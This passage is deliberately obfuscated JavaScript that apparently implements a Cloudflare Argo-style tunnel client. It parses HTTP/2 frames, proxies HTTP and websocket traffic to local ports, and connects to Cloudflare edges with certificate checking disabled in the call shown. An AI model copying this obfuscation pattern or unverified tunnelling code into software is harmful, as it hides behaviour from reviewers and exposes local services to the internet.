        this['showTunnel'] && !this['tunnelState'][de(0x630)] && (process[de(0x5b2)][de(0x362)](a['IOEdo'](this['tunnelUrl'], '\x0a')), this[de(0x5d4)][de(0x630)] = !![]);
        try {
            while (!this[de(0x43c)]) {
                const [d, f, g, h] = await this[de(0x5bb)]();
                if (a[de(0x491)](d, 0x4)) {
                    if (!a['DVOKk'](f, 0x1)) {
                        if (a[de(0x56d)](h['length'], 0x6))
                            throw new Error(a[de(0x619)]);
                        for (let i = 0x0; i < h[de(0x5a7)]; i += 0x6) {
                            const j = h[de(0x22b)](i), k = h[de(0x45f)](i + 0x2);
                            if (j === 0x4) {
                                const l = a['lUwgM'](k, 0xffff);
                                for (const m of this[de(0x3b3)]['keys']()) {
                                    this[de(0x3b3)][de(0x2d1)](m, Math['max'](0x0, a['IOEdo'](this[de(0x3b3)][de(0x12e)](m), l)));
                                }
                            } else
                                a[de(0x491)](j, 0x5) && a[de(0x44d)](k, 0x4000) && k <= 0xffffff && (this['peerMaxFrame'] = k);
                        }
                        this[de(0x218)](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (d === 0x6) {
                    !a[de(0x14d)](f, 0x1) && this['sendFrame'](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (a[de(0x491)](d, 0x8)) {
                    if (a[de(0x606)](h['length'], 0x4))
                        continue;
                    const n = h['readUInt32BE'](0x0) & 0x7fffffff;
                    g === 0x0 ? this[de(0x603)] += n : this[de(0x3b3)]['set'](g, (this[de(0x3b3)][de(0x12e)](g) ?? 0xffff) + n);
                    this['_notifyWindows']();
                    continue;
                }
                if (a[de(0x491)](d, 0x3)) {
                    this[de(0x5c3)][de(0x395)](g);
                    continue;
                }
                if (a[de(0x491)](d, 0x7))
                    break;
                if (d === 0x1) {
                    const o = await this[de(0x419)](f, g, h);
                    !this['streamWindows']['has'](g) && this[de(0x3b3)][de(0x2d1)](g, 0xffff);
                    this['handleHeaders'](g, f, o);
                    continue;
                }
                if (d === 0x0) {
                    this[de(0x6aa)](g, f, h);
                    continue;
                }
            }
        } finally {
            this['stopped'] = !![], this[de(0x380)]();
            for (const p of this[de(0x5c3)][de(0x6c9)]()) {
                p['websocketProxy'] && p[de(0x20f)]['stop']();
            }
            try {
                this[de(0x1e3)][de(0x2dc)]();
            } catch (q) {
            }
        }
    }
    [a0aK(0x5f7)](a, b, c) {
        const df = a0aK, d = {
                'EuNcW': function (i, j) {
                    return i === j;
                },
                'xXMcd': function (i, j) {
                    return i & j;
                },
                'CbgqG': df(0x172),
                'wktGU': 'GET',
                'UGYLz': df(0x3b9),
                'hrBNS': df(0x6e3),
                'vDwLR': 'websocket',
                'eisvb': function (i, j) {
                    return i === j;
                },
                'bmyxV': df(0x3a6),
                'oZQTP': function (i, j) {
                    return i(j);
                }
            }, f = {};
        for (const [i, j] of c) {
            i[df(0x21e)](':') ? f[i] = j : f[i[df(0x425)]()] = j;
        }
        const g = (f[a0X] || '')[df(0x61b)]()[df(0x425)]();
        if (d[df(0x10f)](g, a0Y)) {
            this[df(0x45d)](a);
            d[df(0x217)](b, 0x1) && (this[df(0x559)][df(0x6e1)] = !![]);
            return;
        }
        const h = {
            'method': f[d[df(0x130)]] || d[df(0x2f1)],
            'path': f[d[df(0x38b)]] || '/',
            'authority': f[d[df(0x3ca)]] || '',
            'headers': c[df(0x6cc)](([k]) => !k[df(0x21e)](':')),
            'body': [],
            'upgrade': g,
            'websocket': d[df(0x10f)](g, d[df(0x374)]) || d['eisvb']((f[d[df(0x5cd)]] || '')[df(0x425)](), d['vDwLR']),
            'ended': d[df(0x404)](Boolean, b & 0x1),
            'finished': ![]
        };
        this[df(0x5c3)]['set'](a, h);
        if (h[df(0x49e)])
            h['websocketProxy'] = new a0ar(this, a, h, this[df(0x55c)], this[df(0x348)]), h[df(0x20f)][df(0x577)]();
        else
            h[df(0x6ef)] && this['requestFinished'](a, h);
    }
    [a0aK(0x6aa)](a, b, c) {
        const dg = a0aK, d = {
                'hYsaI': function (g, h) {
                    return g !== h;
                },
                'dobWH': function (g, h) {
                    return g === h;
                },
                'pIVbG': function (g, h) {
                    return g & h;
                },
                'kBRXd': function (g, h) {
                    return g !== h;
                },
                'bQkXn': function (g, h) {
                    return g(h);
                },
                'sXXho': function (g, h) {
                    return g & h;
                }
            };
        this[dg(0x431)](0x0, c['length']), this[dg(0x431)](a, c[dg(0x5a7)]);
        if (d['hYsaI'](this[dg(0x559)], null) && d[dg(0x52c)](this[dg(0x559)][dg(0x4d3)], a)) {
            this[dg(0x559)]['feed'](c);
            d[dg(0x1bf)](b, 0x1) && (this[dg(0x559)]['finished'] = !![]);
            return;
        }
        const f = this[dg(0x5c3)]['get'](a);
        if (f === undefined)
            return;
        if (d[dg(0x42d)](f[dg(0x20f)], undefined)) {
            f[dg(0x20f)][dg(0x4e4)](c, d[dg(0x449)](Boolean, d[dg(0x6cd)](b, 0x1)));
            return;
        }
        c['length'] && f['body'][dg(0x293)](c), d[dg(0x6cd)](b, 0x1) && (f[dg(0x6ef)] = !![], this[dg(0x664)](a, f));
    }
}
class a0ar {
    constructor(a, b, c, d, f) {
        const dh = a0aK, g = dh(0x53d)['split']('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this[dh(0x43c)] = ![];
                continue;
            case '1':
                this['log'] = f;
                continue;
            case '2':
                this['queue'] = [];
                continue;
            case '3':
                this[dh(0x561)] = c;
                continue;
            case '4':
                this[dh(0x55c)] = d;
                continue;
            case '5':
                this['waiters'] = [];
                continue;
            case '6':
                this[dh(0x4d3)] = b;
                continue;
            case '7':
                this['connection'] = a;
                continue;
            case '8':
                this[dh(0x1e3)] = null;
                continue;
            }
            break;
        }
    }
    ['start']() {
        const di = a0aK;
        this[di(0x3bd)]()[di(0x23f)](() => {
        });
    }
    [a0aK(0x4e4)](a, b = ![]) {
        const dj = a0aK;
        a[dj(0x5a7)] && this[dj(0x402)][dj(0x293)](a), b && this['queue'][dj(0x293)](null), this[dj(0x195)]();
    }
    [a0aK(0x6d6)]() {
        const dk = a0aK, a = {
                'MrynW': function (b, c) {
                    return b !== c;
                }
            };
        if (this[dk(0x43c)])
            return;
        this['stopped'] = !![], this[dk(0x195)]();
        if (a['MrynW'](this[dk(0x1e3)], null))
            try {
                this['sock'][dk(0x2dc)]();
            } catch (b) {
            }
    }
    [a0aK(0x195)]() {
        const dl = a0aK, a = {
                'rsWsw': function (b) {
                    return b();
                }
            };
        for (const b of this[dl(0x274)]) {
            a['rsWsw'](b);
        }
        this[dl(0x274)] = [];
    }
    async ['_next']() {
        const dm = a0aK;
        while (!this[dm(0x43c)]) {
            if (this['queue']['length'])
                return this['queue']['shift']();
            await new Promise(a => this['waiters'][dm(0x293)](a));
        }
        return null;
    }
    async ['run']() {
        const dn = a0aK, a = {
                'eKtGv': function (b, c) {
                    return b(c);
                },
                'UwnqE': function (b, c) {
                    return b === c;
                },
                'dMGba': 'content-length',
                'toPFs': dn(0x6fb),
                'lqfWE': dn(0x475),
                'vMQFM': dn(0x1a3),
                'LsJCm': function (b, c) {
                    return b === c;
                },
                'aPatM': dn(0x173),
                'FDMlE': dn(0x605),
                'iukwx': function (b, c) {
                    return b === c;
                },
                'UZLIY': dn(0x60b),
                'sEFel': dn(0x5ac),
                'URkgO': function (b, c) {
                    return b(c);
                },
                'yDZpy': dn(0x49b),
                'ysgcg': dn(0x20b),
                'gkrkz': dn(0x359),
                'IGAkg': function (b, c) {
                    return b + c;
                },
                'mNUKK': dn(0x2a4),
                'RUWGt': dn(0x69f),
                'CPAQZ': '502'
            };
        try {
            this['sock'] = await a[dn(0x2f2)](a0at, this[dn(0x55c)]), this[dn(0x464)]();
            const b = await a['eKtGv'](a0aw, this[dn(0x1e3)]), c = [], d = [];
            for (const [i, j] of b[dn(0x3c7)]) {
                const k = i[dn(0x425)]();
                a[dn(0x67e)](k, a[dn(0x1bb)]) && d[dn(0x293)]([
                    k,
                    j
                ]);
                const l = k[dn(0x21e)](a[dn(0x57d)]) || k['startsWith'](a[dn(0x27c)]) || k['startsWith'](a[dn(0x342)]) || k[dn(0x21e)](':');
                (!l || a[dn(0x210)](k, a['aPatM']) || k === a['FDMlE'] || a[dn(0x488)](k, a[dn(0x67d)])) && c[dn(0x293)]([
                    k,
                    j
                ]);
            }
            const f = a[dn(0x2f2)](a0ao, c), g = b[dn(0x423)] === 0x65 ? 0xc8 : b[dn(0x423)], h = [
                    [
                        a[dn(0x54f)],
                        a[dn(0x211)](String, g)
                    ],
                    ...d,
                    [
                        a[dn(0x5ca)],
                        f
                    ],
                    [
                        a[dn(0x3c3)],
                        a[dn(0x456)]
                    ]
                ];
            this[dn(0x173)][dn(0x1de)](this[dn(0x4d3)], h), this[dn(0x20e)]()[dn(0x23f)](() => {
            }), await this[dn(0x695)](b[dn(0x367)]);
        } catch (m) {
            this['log'][dn(0x6dd)](a[dn(0x5cb)](a[dn(0x5cb)](a[dn(0x6ba)], this[dn(0x4d3)]) + a[dn(0x37b)], m));
            try {
                this['connection'][dn(0x1de)](this[dn(0x4d3)], [[
                        a[dn(0x54f)],
                        a[dn(0x686)]
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this[dn(0x6d6)]();
        }
    }
    async [a0aK(0x695)](a) {
        const dp = a0aK;
        a['length'] && await this[dp(0x173)][dp(0x3c4)](this['streamId'], a, ![]);
        for await (const b of this['sock']) {
            if (this[dp(0x43c)])
                break;
            await this[dp(0x173)][dp(0x3c4)](this[dp(0x4d3)], b, ![]);
        }
        !this[dp(0x43c)] && await this[dp(0x173)][dp(0x3c4)](this[dp(0x4d3)], Buffer[dp(0x539)](0x0), !![]);
    }
    async [a0aK(0x20e)]() {
        const dq = a0aK, a = {
                'LPqfv': function (b, c) {
                    return b === c;
                }
            };
        while (!this[dq(0x43c)]) {
            const b = await this[dq(0x64e)]();
            if (a[dq(0x406)](b, null))
                return;
            try {
                this[dq(0x1e3)][dq(0x362)](b);
            } catch (c) {
                this[dq(0x43c)] = !![];
                return;
            }
        }
    }
    [a0aK(0x464)]() {
        const dr = a0aK, a = {
                'ilBkf': function (i, j) {
                    return i + j;
                },
                'oLQdB': function (i, j) {
                    return i + j;
                },
                'zXoDY': dr(0x35f),
                'noLAT': dr(0x26f),
                'GVCpO': function (i, j) {
                    return i === j;
                },
                'pEPaO': 'host',
                'ZFhPL': dr(0x173),
                'fXRfc': 'upgrade',
                'omdcs': function (i, j) {
                    return i === j;
                },
                'ZZrJC': dr(0x6ec),
                'yFELA': dr(0x598),
                'OhfaN': dr(0x5d2),
                'SdQqu': function (i, j) {
                    return i === j;
                },
                'GruCF': function (i, j) {
                    return i + j;
                },
                'uRetn': function (i, j) {
                    return i + j;
                },
                'bSInA': function (i, j) {
                    return i + j;
                },
                'IroMB': function (i, j) {
                    return i + j;
                },
                'gyLiJ': dr(0x319),
                'azrbX': 'base64',
                'pTzPF': dr(0x5c5),
                'nAzFV': dr(0x485),
                'UDWgO': dr(0x640),
                'NYpuQ': dr(0x331)
            }, b = new URL(this[dr(0x55c)]), c = this[dr(0x561)][dr(0x5d0)][dr(0x21e)]('/') ? this['request'][dr(0x5d0)] : a[dr(0x385)]('/', this[dr(0x561)][dr(0x5d0)]), d = [a['oLQdB'](a['zXoDY'], c) + a[dr(0x2a1)]];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[dr(0x561)][dr(0x3c7)]) {
            const k = i[dr(0x425)]();
            if (a[dr(0x6c0)](k, a[dr(0x116)]) || a[dr(0x6c0)](k, a[dr(0x5e4)]) || k === a[dr(0x12c)] || a[dr(0x450)](k, a[dr(0x29c)]) || a['omdcs'](k, dr(0x403)))
                continue;
            if (a['omdcs'](k, a['yFELA']))
                f = !![];
            else {
                if (a[dr(0x450)](k, a['OhfaN']))
                    g = !![];
                else
                    a[dr(0x3a7)](k, dr(0x55c)) && (h = !![]);
            }
            d['push'](a[dr(0x5d1)](a[dr(0x4da)](i, ':\x20'), j));
        }
        d[dr(0x293)](a[dr(0x66f)](dr(0x54b), b[dr(0x170)])), !h && this[dr(0x561)][dr(0x161)] && d['push'](a[dr(0x23e)](a[dr(0x39d)], this[dr(0x561)][dr(0x161)])), !f && d[dr(0x293)](a['bSInA'](dr(0x18b), a0k[dr(0x67a)](0x10)[dr(0x206)](a['azrbX']))), !g && d[dr(0x293)](dr(0x3ef)), d[dr(0x293)](a[dr(0x294)]), d[dr(0x293)](a[dr(0x204)]), this[dr(0x1e3)]['write'](Buffer[dr(0x4e8)](a['bSInA'](d[dr(0x575)]('\x0d\x0a'), a['UDWgO']), a[dr(0x512)]));
    }
}
class a0as {
    constructor(a, b, c) {
        const ds = a0aK, d = ds(0x678)[ds(0x53c)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                this['streamId'] = b;
                continue;
            case '1':
                this[ds(0x173)] = a;
                continue;
            case '2':
                this[ds(0x6e1)] = ![];
                continue;
            case '3':
                this[ds(0x55d)] = Buffer[ds(0x539)](0x0);
                continue;
            case '4':
                this[ds(0x348)] = c;
                continue;
            }
            break;
        }
    }
    [a0aK(0x577)](a, b, c, d) {
        const dt = a0aK, f = {
                'iWhhV': function (g, h) {
                    return g(h);
                },
                'dGvrb': function (g, h, i, j, k, l, m) {
                    return g(h, i, j, k, l, m);
                }
            };
        this['connection'][dt(0x3c4)](this['streamId'], f[dt(0x26c)](a0ad, 0x0), ![]), this[dt(0x173)][dt(0x3c4)](this['streamId'], f['dGvrb'](a0ae, 0x1, 0x0, a, b, c, d), ![]);
    }
    [a0aK(0x4e4)](a) {
        const du = a0aK, b = {
                'YVtLz': function (f, g) {
                    return f(g);
                },
                'fHlER': function (f, g) {
                    return f + g;
                },
                'ZKTqW': du(0x1ef),
                'JSigs': 'unknown',
                'azaDO': 'tunnel\x20registration\x20failed:\x20',
                'xMlNz': du(0x4e3)
            };
        this['buffer'] = this[du(0x55d)]['length'] ? Buffer[du(0x117)]([
            this[du(0x55d)],
            a
        ]) : a;
        let c, d;
        [c, d] = b[du(0x268)](a0af, this[du(0x55d)]), this['buffer'] = d;
        for (const f of c) {
            try {
                const g = b['YVtLz'](a0ai, f);
                g['ok'] ? (this[du(0x348)][du(0x684)](b[du(0x2ed)](b['ZKTqW'], g[du(0x51f)] || b['JSigs'])), this['connection'][du(0x634)] = !![]) : this['log']['warning'](b[du(0x21d)] + (g['error'] || b['xMlNz']));
            } catch (h) {
                this['log'][du(0x550)](du(0x3e1) + h);
            }
        }
    }
}
function a0at(a) {
    const dv = a0aK, b = {
            'QFPdF': function (c, d) {
                return c(d);
            },
            'wWCLh': function (c, d, f) {
                return c(d, f);
            },
            'Lazwm': function (c, d, f) {
                return c(d, f);
            },
            'QQIVn': dv(0x528),
            'BznrX': 'secureConnect',
            'hDIlp': function (c, d, f) {
                return c(d, f);
            },
            'ECZok': 'origin\x20must\x20be\x20an\x20http://\x20or\x20https://\x20URL',
            'YYjDL': dv(0x675),
            'BnxvF': function (c, d) {
                return c === d;
            },
            'QnvvQ': dv(0x3fc),
            'dNaRt': dv(0x6b2)
        };
    return new Promise((c, d) => {
        const dw = dv, f = {
                'iRGnn': function (n, o, p) {
                    return b['hDIlp'](n, o, p);
                }
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            d(new Error(b[dw(0x460)]));
            return;
        }
        if (![
                b['YYjDL'],
                'https:'
            ][dw(0x2a8)](g[dw(0x4a3)]) || !g['hostname']) {
            d(new Error(b[dw(0x460)]));
            return;
        }
        const h = b[dw(0x702)](g['protocol'], b[dw(0x1c5)]), i = g[dw(0x2ab)] || (h ? 0x1bb : 0x50), j = a0i[dw(0x6b2)]({
                'host': g[dw(0x214)],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const dx = dw, q = dx(0x4f0)[dx(0x53c)]('|');
                let r = 0x0;
                while (!![]) {
                    switch (q[r++]) {
                    case '0':
                        j[dx(0x4b0)](dx(0x528), m);
                        continue;
                    case '1':
                        if (k)
                            return;
                        continue;
                    case '2':
                        b[dx(0x29f)](o, p);
                        continue;
                    case '3':
                        j['setTimeout'](0x0);
                        continue;
                    case '4':
                        k = !![];
                        continue;
                    }
                    break;
                }
            }, m = o => {
                const dy = dw;
                !k && b[dy(0x266)](l, d, o);
            };
        j['on'](b[dw(0x187)], m), j[dw(0x133)](0x7530, () => j['destroy'](new Error('origin\x20connection\x20timeout'))), j['on'](b[dw(0x264)], () => {
            const dz = dw;
            if (!h) {
                b[dz(0x3b4)](l, c, j);
                return;
            }
            const o = a0j[dz(0x6b2)]({
                'socket': j,
                'servername': g[dz(0x214)]
            });
            o['on'](b[dz(0x187)], p => {
                !k && f['iRGnn'](l, d, p);
            }), o['on'](b[dz(0x523)], () => {
                l(c, o);
            });
        });
    });
}
function a0au(a) {
    const dA = a0aK, b = {
            'cMDXO': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; d < a['rawHeaders'][dA(0x5a7)]; d += 0x2) {
        c[dA(0x293)]([
            a['rawHeaders'][d],
            a[dA(0x226)][b[dA(0x3fe)](d, 0x1)]
        ]);
    }
    return c;
}
function a0av(a, b, c, d, f) {
    const dB = a0aK, g = {
            'eoYRM': function (h, i) {
                return h(i);
            },
            'eUZmQ': function (h, i) {
                return h(i);
            },
            'vHBhi': dB(0x3a4),
            'MsCuU': dB(0x675),
            'Hyrzh': dB(0x3fc),
            'HBjnL': function (h, i) {
                return h === i;
            },
            'LGibg': function (h, i) {
                return h === i;
            },
            'OQfRp': dB(0x170),
            'TskeD': function (h, i) {
                return h === i;
            },
            'PKCCu': dB(0x173),
            'cKTon': function (h, i) {
                return h === i;
            },
            'lcMcK': dB(0x6ec),
            'SuBBq': dB(0x5c1),
            'jwDFG': dB(0x4f2),
            'UDesQ': function (h, i) {
                return h(i);
            },
            'PpANj': 'error'
        };
    return new Promise((h, i) => {
        const dE = dB, j = {
                'IAnZQ': function (r, s) {
                    const dC = a0b;
                    return g[dC(0x4c7)](r, s);
                },
                'gNctu': function (r, s) {
                    const dD = a0b;
                    return g[dD(0x279)](r, s);
                }
            };
        let k;
        try {
            k = new URL(a);
        } catch (r) {
            g[dE(0x4c7)](i, new Error(g[dE(0x5c9)]));
            return;
        }
        if (![
                g[dE(0x4ae)],
                g[dE(0x1d1)]
            ][dE(0x2a8)](k['protocol']) || !k[dE(0x214)]) {
            i(new Error(g[dE(0x5c9)]));
            return;
        }
        const l = g[dE(0x143)](k[dE(0x4a3)], g[dE(0x1d1)]), m = k[dE(0x2ab)] || (l ? 0x1bb : 0x50), n = {};
        for (const [s, t] of d) {
            const u = s['toLowerCase']();
            if (g['LGibg'](u, g['OQfRp']) || g['TskeD'](u, g[dE(0x622)]) || g[dE(0x238)](u, 'transfer-encoding') || g[dE(0x143)](u, g[dE(0x37c)]))
                continue;
            n[s] = t;
        }
        n[g['SuBBq']] = k[dE(0x170)];
        f['length'] && (n[g[dE(0x368)]] = g['UDesQ'](String, f[dE(0x5a7)]));
        const o = c[dE(0x21e)]('/') ? c : '/' + c, p = l ? a0h : a0g, q = p[dE(0x561)]({
                'hostname': k[dE(0x214)],
                'port': m,
                'path': o,
                'method': b,
                'headers': n,
                'timeout': 0x7530
            }, v => {
                const dF = dE;
                j[dF(0x205)](h, {
                    'status': v['statusCode'],
                    'headers': j['gNctu'](a0au, v),
                    'body': v
                });
            });
        q['on'](g[dE(0x243)], v => i(v)), q[dE(0x42b)](f[dE(0x5a7)] ? f : undefined);
    });
}
function a0aw(a) {
    const dG = a0aK, b = {
            'iEHoL': function (c, d) {
                return c < d;
            },
            'udcld': function (c) {
                return c();
            },
            'gaDlM': dG(0x331),
            'XYOOW': function (c, d, f) {
                return c(d, f);
            },
            'eNqSm': function (c, d) {
                return c(d);
            },
            'BKWZp': function (c, d) {
                return c > d;
            },
            'VWElX': function (c, d) {
                return c + d;
            },
            'Undbe': function (c, d) {
                return c(d);
            },
            'lJyLS': 'data',
            'vORjc': dG(0x42b),
            'AHzgp': dG(0x528)
        };
    return new Promise((c, d) => {
        const dH = dG, f = {
                'VPIJh': b[dH(0x453)],
                'baUgg': dH(0x528),
                'rPBlZ': b[dH(0x5a5)],
                'FASuj': dH(0x31e),
                'DNjAx': function (l) {
                    const dI = dH;
                    return b[dI(0x4ac)](l);
                },
                'xJrPx': dH(0x3fb)
            };
        let g = Buffer[dH(0x539)](0x0);
        const h = () => {
                const dJ = dH;
                a[dJ(0x4b0)](f[dJ(0x5d9)], i), a[dJ(0x4b0)](f[dJ(0x36e)], j), a[dJ(0x4b0)](f['rPBlZ'], k), a[dJ(0x4b0)](f[dJ(0x3d8)], k);
            }, i = l => {
                const dK = dH;
                g = g[dK(0x5a7)] ? Buffer[dK(0x117)]([
                    g,
                    l
                ]) : l;
                const m = g[dK(0x1ee)](dK(0x640));
                if (b[dK(0x65a)](m, 0x0))
                    return;
                b[dK(0x4ac)](h);
                const n = g[dK(0x626)](0x0, m)[dK(0x206)](b[dK(0x4ca)]), o = n['split']('\x0d\x0a'), p = o[0x0]['split']('\x20'), q = b[dK(0x65d)](parseInt, p[0x1], 0xa);
                if (!Number[dK(0x691)](q)) {
                    b[dK(0x22e)](d, new Error(dK(0x2a7)));
                    return;
                }
                const r = [];
                for (let s = 0x1; s < o[dK(0x5a7)]; s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t[dK(0x1ee)](':');
                    b[dK(0x154)](u, 0x0) && r[dK(0x293)]([
                        t['slice'](0x0, u)['trim'](),
                        t[dK(0x1f8)](u + 0x1)[dK(0x61b)]()
                    ]);
                }
                b[dK(0x22e)](c, {
                    'status': q,
                    'headers': r,
                    'rest': g[dK(0x626)](b[dK(0x5ee)](m, 0x4))
                });
            }, j = l => {
                const dL = dH;
                b[dL(0x4ac)](h), b[dL(0x6f1)](d, l);
            }, k = () => {
                const dM = dH;
                f[dM(0x5a0)](h), d(new Error(f[dM(0x537)]));
            };
        a['on'](dH(0x6ac), i), a['on'](b[dH(0x574)], j), a['on'](dH(0x42b), k), a['on']('close', k);
    });
}
function a0ax(a, b) {
    const dN = a0aK, c = {
            'TsxRL': dN(0x317),
            'NOQgZ': dN(0x15b),
            'udkKv': function (h, i) {
                return h + i;
            },
            'xLXkN': function (h, i) {
                return h + i;
            },
            'QCSrc': function (h, i) {
                return h + i;
            },
            'kRBVi': dN(0x69f),
            'IDPPW': function (h) {
                return h();
            }
        }, d = a0V[dN(0x1f8)]()['sort'](() => Math[dN(0x318)]() - 0.5);
    let f = null;
    const g = async () => {
        const dO = dN, h = {
                'wVpxk': function (i, j) {
                    return i + j;
                },
                'ugSAL': dO(0x24d),
                'HqpDY': c['TsxRL'],
                'ddgwt': dO(0x528),
                'OvqBy': c[dO(0x543)]
            };
        for (const i of d) {
            try {
                return await new Promise((j, k) => {
                    const dQ = dO, l = {
                            'yjqYA': function (n, o) {
                                return n !== o;
                            },
                            'yMfjw': function (n, o) {
                                const dP = a0b;
                                return h[dP(0x3bf)](n, o);
                            },
                            'RUwRT': function (n, o) {
                                return n + o;
                            },
                            'fEEWz': h[dQ(0x1cb)]
                        }, m = a0j['connect']({
                            'host': i,
                            'port': a0W,
                            'ALPNProtocols': ['h2'],
                            'servername': h[dQ(0x260)],
                            'rejectUnauthorized': a
                        });
                    m['setTimeout'](0x2710, () => m[dQ(0x2dc)](new Error('connection\x20timeout'))), m['on'](h[dQ(0x324)], k), m['on'](h[dQ(0x573)], () => {
                        const dR = dQ, n = m[dR(0x5f5)];
                        if (n && l[dR(0x165)](n, 'h2')) {
                            m[dR(0x2dc)](new Error(dR(0x3f8)));
                            return;
                        }
                        m[dR(0x133)](0x0), b['info'](l[dR(0x2c0)](l[dR(0x166)](l[dR(0x69c)], i) + ':', a0W)), j(m);
                    });
                });
            } catch (j) {
                f = j, b['warning'](c[dO(0x579)](c[dO(0x4e1)](c[dO(0x1c8)]('edge\x20', i), c['kRBVi']), j));
            }
        }
        throw new Error(c[dO(0x4e1)]('all\x20Cloudflare\x20edges\x20failed:\x20', f));
    };
    return c[dN(0x617)](g);
}
const a0ay = 0x2;
function a0az(a) {
    const dS = a0aK, b = {
            'Uocww': function (c, d) {
                return c === d;
            },
            'XHNSF': dS(0x6b0)
        };
    if (b['Uocww'](typeof a, b[dS(0x31a)])) {
        const c = a[dS(0x61b)]();
        if (c)
            try {
                return JSON[dS(0x110)](c);
            } catch (d) {
            }
        return {};
    }
    return a && typeof a === dS(0x30b) ? a : {};
}
class a0aA {
    constructor(a) {
        const dT = a0aK;
        this[dT(0x348)] = a, this[dT(0x167)] = new Map();
    }
    async [a0aK(0x2d5)](a, b) {
        const dU = a0aK, c = {
                'LTfJd': function (l, m) {
                    return l > m;
                },
                'UYBTn': dU(0x469),
                'nspqd': function (l, m) {
                    return l + m;
                },
                'uYGiK': dU(0x4af),
                'JZgCl': dU(0x500),
                'VNkoD': function (l, m) {
                    return l + m;
                },
                'mnKRP': function (l, m) {
                    return l + m;
                },
                'yFMpb': '\x20->\x20127.0.0.1:'
            }, d = this['tunnels'][dU(0x12e)](a) || [];
        if (c[dU(0x1c0)](d[dU(0x5a7)], 0x0) && !b) {
            const l = new Error('tunnel\x20already\x20exists\x20on\x20port\x20' + a + ',\x20set\x20duplicate=true\x20to\x20force\x20creation');
            l['status'] = 0x199, l[dU(0x2ab)] = a;
            throw l;
        }
        let f, g, h, i;
        try {
            [f, g, h, i] = await a0an(c[dU(0x17c)]);
        } catch (m) {
            const n = new Error(c['nspqd'](c[dU(0x66e)], m[dU(0x564)]));
            n[dU(0x423)] = 0x1f4, n[dU(0x2ab)] = a;
            throw n;
        }
        const j = f[dU(0x21e)](c[dU(0x15c)]) ? f : c[dU(0x15c)] + f, k = {
                'tunnelDomain': j,
                'port': a,
                'createdAt': new Date()[dU(0x1fd)]()[dU(0x4bd)](/\.\d{3}Z$/, 'Z'),
                'stopped': ![],
                'sock': null,
                'runPromise': null
            };
        return k['runPromise'] = this[dU(0x1bd)](k, g, h, i)[dU(0x23f)](o => this['log'][dU(0x6dd)](dU(0x510) + j + dU(0x659) + o[dU(0x564)])), d[dU(0x293)](k), this[dU(0x167)][dU(0x2d1)](a, d), this[dU(0x348)][dU(0x684)](c['VNkoD'](c[dU(0x51e)](dU(0x340), j) + c[dU(0x51b)], a)), k;
    }
    [a0aK(0x1d7)]() {
        const dV = a0aK, a = [], b = [...this[dV(0x167)][dV(0x654)]()][dV(0x5fe)]((c, d) => c - d);
        for (const c of b) {
            for (const d of this['tunnels'][dV(0x12e)](c)) {
                a[dV(0x293)]({
                    'tunnel_domain': d[dV(0x494)],
                    'port': d[dV(0x2ab)],
                    'created_at': d[dV(0x1ec)]
                });
            }
        }
        return a;
    }
    async [a0aK(0x1e6)](a, b) {
        const dW = a0aK, c = {
                'bczcx': function (i, j) {
                    return i === j;
                },
                'FSraG': function (i, j) {
                    return i === j;
                },
                'nKqDG': function (i, j) {
                    return i > j;
                },
                'pvkxF': function (i, j) {
                    return i + j;
                }
            }, d = this[dW(0x167)][dW(0x12e)](a) || [];
        if (c[dW(0x1d6)](d[dW(0x5a7)], 0x0))
            return {
                'status': 0x194,
                'message': dW(0x1a6) + a
            };
        let f;
        if (b === undefined || c[dW(0x3b0)](b, null) || c[dW(0x3b0)](b, '')) {
            if (d['length'] > 0x1)
                return {
                    'status': 0x199,
                    'message': dW(0x625) + a + ',\x20specify\x20tunnel_domain\x20to\x20disambiguate'
                };
            f = d;
        } else {
            f = d['filter'](i => i[dW(0x494)] === b);
            if (c['FSraG'](f[dW(0x5a7)], 0x0))
                return {
                    'status': 0x194,
                    'message': 'no\x20tunnel\x20found\x20on\x20port\x20' + a + dW(0x440) + b
                };
        }
        const g = [];
        for (const i of f) {
            i[dW(0x43c)] = !![];
            if (i['sock'] !== null)
                try {
                    i['sock'][dW(0x2dc)]();
                } catch (j) {
                }
            await i[dW(0x53b)]['catch'](() => {
            }), g[dW(0x293)]({
                'tunnel_domain': i['tunnelDomain'],
                'port': i[dW(0x2ab)],
                'created_at': i['createdAt']
            });
        }
        const h = d[dW(0x6cc)](k => !k['stopped']);
        c['nKqDG'](h[dW(0x5a7)], 0x0) ? this[dW(0x167)]['set'](a, h) : this['tunnels']['delete'](a);
        for (const k of g) {
            this[dW(0x348)][dW(0x684)](c[dW(0x184)]('argo\x20tunnel\x20deleted:\x20', k['tunnel_domain']));
        }
        return {
            'status': 'ok',
            'deleted': g['length'],
            'tunnels': g
        };
    }
    async ['_runLoop'](a, b, c, d) {
        const dX = a0aK, f = {
                'mQTxe': function (h, i, j) {
                    return h(i, j);
                },
                'LEYCc': function (h, i) {
                    return h + i;
                },
                'fOxmn': dX(0x152),
                'OiTLs': dX(0x178),
                'kkVBq': function (h, i) {
                    return h !== i;
                }
            }, g = dX(0x5fa) + a[dX(0x2ab)];
        while (!a['stopped']) {
            let h = null;
            try {
                h = await f[dX(0x22a)](a0ax, ![], this[dX(0x348)]);
                if (a[dX(0x43c)]) {
                    try {
                        h[dX(0x2dc)]();
                    } catch (i) {
                    }
                    break;
                }
                a[dX(0x1e3)] = h, await new a0aq(h, g, b, c, d, 0x0, this[dX(0x348)], a[dX(0x494)], ![], { 'printed': !![] })[dX(0x3bd)]();
            } catch (j) {
                !a[dX(0x43c)] && this[dX(0x348)][dX(0x6dd)](f['LEYCc'](f['LEYCc'](f[dX(0x48d)] + a[dX(0x494)], f[dX(0x4cb)]), j['message']));
            } finally {
                if (f[dX(0x392)](h, null))
                    try {
                        h[dX(0x2dc)]();
                    } catch (k) {
                    }
                a['sock'] = null;
            }
            !a[dX(0x43c)] && await new Promise(l => setTimeout(l, a0ay * 0x3e8));
        }
    }
}
let a0aB = null, a0aC = null;
const a0aD = new Promise((a, b) => {
